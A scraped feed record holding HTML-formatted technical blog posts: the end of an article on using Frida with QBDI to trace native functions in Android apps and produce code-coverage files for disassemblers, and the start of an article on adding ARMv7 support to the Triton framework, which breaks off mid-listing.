class=\"p\">.</span><span class=\"nx\">base</span><span class=\"p\">);</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">event</span> <span class=\"o\">&amp;</span> <span class=\"nx\">VMEvent</span><span class=\"p\">.</span><span class=\"nx\">EXEC_TRANSFER_CALL</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">warn</span><span class=\"p\">(</span><span class=\"s2\">\" -&gt; transfer call to 0x\"</span> <span class=\"o\">+</span> <span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" (\"</span> <span class=\"o\">+</span> <span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s2\">\"@\"</span> <span class=\"o\">+</span> <span class=\"nx\">offset</span> <span class=\"o\">+</span> <span class=\"s2\">\")\"</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">event</span> <span class=\"o\">&amp;</span> <span class=\"nx\">VMEvent</span><span class=\"p\">.</span><span class=\"nx\">EXEC_TRANSFER_RETURN</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">warn</span><span class=\"p\">(</span><span class=\"s2\">\" &lt;- transfer return from 0x\"</span> <span class=\"o\">+</span> <span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" (\"</span> <span class=\"o\">+</span> <span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s2\">\"@\"</span> <span class=\"o\">+</span> <span class=\"nx\">offset</span> <span class=\"o\">+</span> <span class=\"s2\">\")\"</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n        <span class=\"k\">return</span> <span class=\"nx\">VMAction</span><span class=\"p\">.</span><span class=\"nx\">CONTINUE</span><span class=\"p\">;</span>\n    <span class=\"p\">});</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">vid</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">addVMEventCB</span><span class=\"p\">(</span><span class=\"nx\">VMEvent</span><span class=\"p\">.</span><span class=\"nx\">EXEC_TRANSFER_CALL</span><span class=\"p\">,</span> <span class=\"nx\">vcbk</span><span class=\"p\">);</span> <span class=\"c1\">// register transfer callback</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">vid2</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">addVMEventCB</span><span class=\"p\">(</span><span class=\"nx\">VMEvent</span><span class=\"p\">.</span><span class=\"nx\">EXEC_TRANSFER_RETURN</span><span class=\"p\">,</span> <span class=\"nx\">vcbk</span><span class=\"p\">);</span> <span class=\"c1\">// register return callback</span>\n\n    <span class=\"kr\">const</span> <span class=\"nx\">javavm</span> <span class=\"o\">=</span> <span class=\"nx\">ptr</span><span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]);</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">reserved</span> <span class=\"o\">=</span> <span class=\"nx\">ptr</span><span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]);</span>\n\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Executing \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"(\"</span> <span class=\"o\">+</span> <span class=\"nx\">javavm</span> <span class=\"o\">+</span> <span class=\"s2\">\", \"</span> <span class=\"o\">+</span> <span class=\"nx\">reserved</span> <span class=\"o\">+</span> <span class=\"s2\">\") through QBDI...\"</span><span class=\"p\">);</span>\n    <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"nx\">funcPtr</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"nx\">javavm</span><span class=\"p\">,</span> <span class=\"nx\">reserved</span><span class=\"p\">]);</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">retVal</span> <span class=\"o\">=</span> <span class=\"nx\">state</span><span class=\"p\">.</span><span class=\"nx\">getRegister</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span> <span class=\"c1\">// x86 so return value is stored on $eax</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"() returned \"</span> <span class=\"o\">+</span> <span class=\"nx\">retVal</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">postSync</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">state</span><span class=\"p\">.</span><span class=\"nx\">synchronizeContext</span><span class=\"p\">(</span><span class=\"nx\">ctx</span><span class=\"p\">,</span> <span class=\"nx\">SyncDirection</span><span class=\"p\">.</span><span class=\"nx\">QBDI_TO_FRIDA</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">retVal</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>Ultimately, this script has to be compiled with <tt class=\"docutils literal\"><span class=\"pre\">frida-compile</span></tt> in order to properly include the <tt class=\"docutils literal\"><span class=\"pre\">frida-qbdi.js</span></tt> which contains the QBDI bindings. The compilation procedure is fully described in the official documentation page <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id28\" id=\"id11\">[11]</a>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"demonstration\"> \n  <h3>Demonstration</h3> \n  <asciinema-player src=\"resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/jnionload_trace.cast\" cols=\"175\" rows=\"32\" font-size=\"small\"></asciinema-player> \n </div> \n</div> \n<div class=\"section\" id=\"generating-a-coverage-file\"> \n <h2>Generating a coverage file</h2> \n <p>Having a trace containing all the instructions that have been executed is valuable but not really convenient as it is for reverse engineering purposes. Indeed, it's quite unclear to distinguish at a glance what paths have been taken throughout the execution. In order to properly render the captured trace, an integration in a disassembler may be a great idea. That way, one could accurately visualise which basic blocks have been passed through. Nevertheless, most of the disassemblers don't natively provide an option for doing so — luckily for us, various plugins do. In this example, we are using Lighthouse <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id29\" id=\"id12\">[12]</a> and Dragondance <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id30\" id=\"id13\">[13]</a>, for respectively IDA Pro and Ghidra. These plugins can be easily configured by importing a <strong>code coverage file</strong> in the <tt class=\"docutils literal\">drcov</tt> format <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id31\" id=\"id14\">[14]</a>. This format is used by DynamioRIO <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id32\" id=\"id15\">[15]</a> for storing information about code coverage.</p> \n <p>The <tt class=\"docutils literal\">drcov</tt> format is pretty straightforward: besides header fields (version and flavour), a module table describing the process' memory layout must be specified. A unique ID is assigned to each module. Right afterwards, there is what is called the basic block table. This table contains every basic block that has been hit during the execution. A basic block is defined by three properties: its <strong>start (relative) address</strong>, its <strong>size</strong> and the <strong>ID of the module</strong> it belongs to.</p> \n <p>Since we are able to place a callback at the beginning of every basic block, we can determine these values, thus generate our own file. Instead of working at the instruction scale, we now need to retrieve the base address and the size of all the executed basic blocks. In practice, we have to define a QBDI event callback function of type <tt class=\"docutils literal\">BASIC_BLOCK_NEW</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id33\" id=\"id16\">[16]</a>, responsible for gathering such information. Our function will be called whenever QBDI is about to execute a new basic block, unknown so far. In this case, we don't solely want to print some interesting values about this basic block but create a code coverage file which can be imported in a disassembler later on. However, within a Frida script's context, we're not able to manipulate files. As a result, we must stop using the <tt class=\"docutils literal\">frida</tt> command line utility and run our JS script straight from an underlying Python script, relying on the messaging system Frida offers <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id34\" id=\"id17\">[17]</a>. Doing so allows us to communicate between the JS and Python sides and then perform all actions on the filesystem we need.</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"kd\">var</span> <span class=\"nx\">vcbk</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">newVMCallback</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">vm</span><span class=\"p\">,</span> <span class=\"nx\">evt</span><span class=\"p\">,</span> <span class=\"nx\">gpr</span><span class=\"p\">,</span> <span class=\"nx\">fpr</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">module</span> <span class=\"o\">=</span> <span class=\"nx\">Process</span><span class=\"p\">.</span><span class=\"nx\">getModuleByAddress</span><span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span><span class=\"p\">);</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">base_addr</span> <span class=\"o\">=</span> <span class=\"nx\">ptr</span><span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span> <span class=\"o\">-</span> <span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">base</span><span class=\"p\">);</span> <span class=\"c1\">// address must be relative to the module's start</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">size</span> <span class=\"o\">=</span> <span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockEnd</span> <span class=\"o\">-</span> <span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span><span class=\"p\">;</span>\n    <span class=\"nx\">send</span><span class=\"p\">({</span><span class=\"s2\">\"bb\"</span><span class=\"o\">:</span> <span class=\"mi\">1</span><span class=\"p\">},</span> <span class=\"nx\">getBBInfo</span><span class=\"p\">(</span><span class=\"nx\">base_addr</span><span class=\"p\">,</span> <span class=\"nx\">size</span><span class=\"p\">,</span> <span class=\"nx\">module</span><span class=\"p\">));</span> <span class=\"c1\">// send the newly discovered basic block to the Python side</span>\n    <span class=\"k\">return</span> <span class=\"nx\">VMAction</span><span class=\"p\">.</span><span class=\"nx\">CONTINUE</span><span class=\"p\">;</span>\n<span class=\"p\">});</span>\n<span class=\"kd\">var</span> <span class=\"nx\">vid</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">addVMEventCB</span><span class=\"p\">(</span><span class=\"nx\">VMEvent</span><span class=\"p\">.</span><span class=\"nx\">BASIC_BLOCK_NEW</span><span class=\"p\">,</span> <span class=\"nx\">vcbk</span><span class=\"p\">);</span>\n</pre> \n </div> \n <p>Note that the <tt class=\"docutils literal\">getBBInfo()</tt> function only serialises information about the basic block before sending the message over. Obviously, the Python side has to handle this kind of message, keep execution-related content in memory and finally generate a code coverage file accordingly, in the proper format described above. If everything goes well, the output file can be loaded in either IDA Pro or Ghidra thanks to their corresponding code coverage plugins. All the executed basic blocks will be highlighted — it's now much clearer for us to follow the execution flow and focus only on relevant parts of the code.</p> \n <img alt=\"\" src=\"http://blog.quarkslab.com/resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/graph.png\" style=\"height: 450px;\" /> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>The easiness of Java/Kotlin reverse engineering encourages Android application developers to rather implement sensitive procedures in C/C++. As a result, reverse engineers' work usually gets painful. Using QBDI alongside Frida turns out to be quite a good option in particular when it comes to looking into those native functions. This combination indeed offers a way to figure out what a function is doing at different levels: <strong>function</strong>, <strong>basic block</strong> and <strong>instruction</strong> scale. Moreover, one could take advantage of QBDI's execution transfer events to resolve external calls to system libraries or keep track of memory accesses and then get the big picture of the execution. To efficiently assist reverse engineers, gathered information can be wisely integrated in some existing reverse-engineering-oriented tools for refining their static analysis. Besides generating a visual representation of the execution flow, getting such feedbacks from runtime is valuable for other security-related purposes such as fuzzing. It's also worth noting that if performances matter, Frida and QBDI both provide C/C++ APIs.</p> \n</div> \n<div class=\"section\" id=\"acknowlegments\"> \n <h2>Acknowlegments</h2> \n <p>Thanks to my colleagues for proofreading this article.</p> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id18\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id1\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/jni/index.html\">https://docs.oracle.com/javase/8/docs/technotes/guides/jni/index.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id19\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id2\">[2]</a></td> \n    <td><a class=\"reference external\" href=\"https://frida.re/\">https://frida.re/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id20\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id3\">[3]</a></td> \n    <td><a class=\"reference external\" href=\"https://passthesalt.ubicast.tv/videos/2020-why-are-frida-and-qbdi-a-great-blend-on-android/\">https://passthesalt.ubicast.tv/videos/2020-why-are-frida-and-qbdi-a-great-blend-on-android/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id21\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id4\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://2020.pass-the-salt.org/files/slides/PTS2020-Talk-05-Frida_QBDI.pdf\">https://2020.pass-the-salt.org/files/slides/PTS2020-Talk-05-Frida_QBDI.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id22\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id5\">[5]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/QBDI/QBDI\">https://github.com/QBDI/QBDI</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id23\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id6\">[6]</a></td> \n    <td><a class=\"reference external\" href=\"https://qbdi.quarkslab.com/#download\">https://qbdi.quarkslab.com/#download</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id24\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id7\">[7]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/QBDI/QBDI/blob/master/tools/frida-qbdi.js\">https://github.com/QBDI/QBDI/blob/master/tools/frida-qbdi.js</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id25\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id8\">[8]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad\">https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id26\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id9\">[9]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html\">https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id27\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id10\">[10]</a></td> \n    <td><a class=\"reference external\" href=\"https://play.google.com/store/apps/details?id=com.whatsapp\">https://play.google.com/store/apps/details?id=com.whatsapp</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id28\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id11\">[11]</a></td> \n    <td><a class=\"reference external\" href=\"https://qbdi.readthedocs.io/en/stable/frida_intro.html\">https://qbdi.readthedocs.io/en/stable/frida_intro.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id29\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id12\">[12]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/gaasedelen/lighthouse\">https://github.com/gaasedelen/lighthouse</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id30\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id13\">[13]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/0ffffffffh/dragondance\">https://github.com/0ffffffffh/dragondance</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id31\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id14\">[14]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.ayrx.me/drcov-file-format\">https://www.ayrx.me/drcov-file-format</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id32\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id15\">[15]</a></td> \n    <td><a class=\"reference external\" href=\"https://dynamorio.org/\">https://dynamorio.org/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id33\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id16\">[16]</a></td> \n    <td><a class=\"reference external\" href=\"https://qbdi.readthedocs.io/en/stable/frida_bindings.html#BASIC_BLOCK_NEW\">https://qbdi.readthedocs.io/en/stable/frida_bindings.html#BASIC_BLOCK_NEW</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id34\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id17\">[17]</a></td> \n    <td><a class=\"reference external\" href=\"https://frida.re/docs/messages/\">https://frida.re/docs/messages/</a></td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Mon, 03 Aug 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/graph.png","linkMd5":"5ae0c216fadd32ce30b31d6d084d735f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn50@2020_6/2020/08/25/01-15-09-208_00a4f0211b6c5799.webp","destWidth":512,"destHeight":606,"sourceBytes":90817,"destBytes":25004,"author":"Tom Czayka","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/graph.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn50@2020_6/2020/08/25/01-15-09-208_00a4f0211b6c5799.webp"},"publishedOrCreatedDate":1598318092714},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Triton v0.8 and ARMv7: A Guideline for Adding New Architectures","link":"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html","description":"<p>As you may have read in our <a class=\"reference external\" href=\"https://blog.quarkslab.com/triton-v08-is-released.html\">previous blog post</a>, the release of Triton v0.8 came with a lot of features and improvements. Support for the ARMv7 architecture is amongst the main contributions of this new version.</p> \n<p>This blog post provides some extra details about how we achieved it. Furthermore, we would like to describe the process and general guidelines to add new architectures to Triton. Contrarily to what one might think, the process is pretty straightforward in terms of integration (the core does not need much modifications). However, it needs some effort regarding development, which ultimately depends on the complexity and quirks of the target architecture.</p> \n<div class=\"section\" id=\"a-quick-introduction-to-the-armv7-architecture\"> \n <h2>A quick introduction to the ARMv7 architecture</h2> \n <p>Let's start with a very brief overview of the architecture. ARMv7 is a RISC processor, with a Load/Store memory model (which means memory access is restricted to specific instructions). It has thirteen general-purpose 32-bit registers (<tt class=\"docutils literal\">R0</tt> to <tt class=\"docutils literal\">R12</tt>) and three 32-bit registers which have special uses: <tt class=\"docutils literal\">SP</tt> (Stack Pointer), <tt class=\"docutils literal\">LR</tt> (Link Register), and <tt class=\"docutils literal\">PC</tt> (Program Counter) (they can also be referred to as <tt class=\"docutils literal\">R13</tt>, <tt class=\"docutils literal\">R14</tt>, and <tt class=\"docutils literal\">R15</tt>, respectively). Besides, there is a 32-bit Application Program Status Register (<tt class=\"docutils literal\">APSR</tt>), which holds the flags (<tt class=\"docutils literal\">N</tt>, <tt class=\"docutils literal\">Z</tt>, <tt class=\"docutils literal\">C</tt> and <tt class=\"docutils literal\">V</tt>).</p> \n <p>One peculiar aspect of the architecture is that it has two main execution modes: ARM and Thumb (instructions are encoded for one or the other). Transitions between these two modes can occur anytime during execution (only through specific instructions, though). Instructions encoded for ARM mode are fixed in size, 4 bytes; whereas those encoded for Thumb can be 2 or 4 bytes long. Another interesting feature, is that most instructions are conditional, that is, they execute (or not) based on the current values of the flags. Lastly, the memory also offers flexibility as data accesses can be either little-endian or big-endian (just data, instructions are always little-endian).</p> \n <p>The ubiquity of ARM processors is one of the main reasons for adding support for ARMv7 in Triton. ARMv7 is a widely popular architecture, particularly in embedded devices and mobile phones. We wanted to bring the advantages of Triton to this architecture (most tools are prepared to work on Intel x86/x86_64 only). The other reason is to show the flexibility and extensibility of Triton. ARMv7 poses some challenges in terms of implementation given its many features and peculiarities (some of them quite different from the rest of the supported architectures). Therefore, ARMv7 makes a great architecture to add to the list of supported ones.</p> \n <p>Now without further ado, let's describe all the necessary steps to implement a new architecture in Triton.</p> \n</div> \n<div class=\"section\" id=\"step-1-describing-registers-specification-and-defining-enums\"> \n <h2>Step 1: Describing registers specification and defining enums</h2> \n <p>The first step consists in describing the registers specification of the new architecture. The description is defined in a <tt class=\"docutils literal\">*.spec*</tt> file and will be interpreted as C/C++ macro definitions. The definitions are pretty straightforward and must follow the following syntax for each register:</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">UPPER_NAME</span><span class=\"p\">,</span> <span class=\"n\">LOWER_NAME</span><span class=\"p\">,</span> <span class=\"n\">UPPER_BIT_POS</span><span class=\"p\">,</span> <span class=\"n\">LOWER_BIT_POS</span><span class=\"p\">,</span> <span class=\"n\">PARENT_REG</span><span class=\"p\">,</span> <span class=\"n\">IS_MUTABLE</span><span class=\"p\">)</span>\n</pre> \n </div> \n <p><tt class=\"docutils literal\">UPPER_NAME</tt> and <tt class=\"docutils literal\">LOWER_NAME</tt> are the string name of the register (e.g: <tt class=\"docutils literal\">R1</tt> and <tt class=\"docutils literal\">r1</tt>). <tt class=\"docutils literal\">UPPER_BIT_POS</tt> and <tt class=\"docutils literal\">LOWER_BIT_POS</tt> are the bit positions of the register in its bitvector. For ARMv7 these fields are mainly used to define the size of the register. So for every ARMv7 register, their lower bit position is <tt class=\"docutils literal\">0</tt> and their upper bit position is <tt class=\"docutils literal\">31</tt> but for other architectures like x86, this field varies (e.g: the <tt class=\"docutils literal\">ah</tt> register has an upper bit position to <tt class=\"docutils literal\">15</tt> and a lower bit position to <tt class=\"docutils literal\">8</tt>). The <tt class=\"docutils literal\">IS_MUTABLE</tt> field defines if the register is writable (e.g: <tt class=\"docutils literal\">ZXR</tt> in AArch64 is immutable). Below the ARMv7 spec file we made for this architecture:</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"c1\">// Thirteen general-purpose 32-bit registers, R0 to R12</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">R0</span><span class=\"p\">,</span>   <span class=\"n\">r0</span><span class=\"p\">,</span>   <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">R0</span><span class=\"p\">,</span>  <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// r0</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">R1</span><span class=\"p\">,</span>   <span class=\"n\">r1</span><span class=\"p\">,</span>   <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">R1</span><span class=\"p\">,</span>  <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// 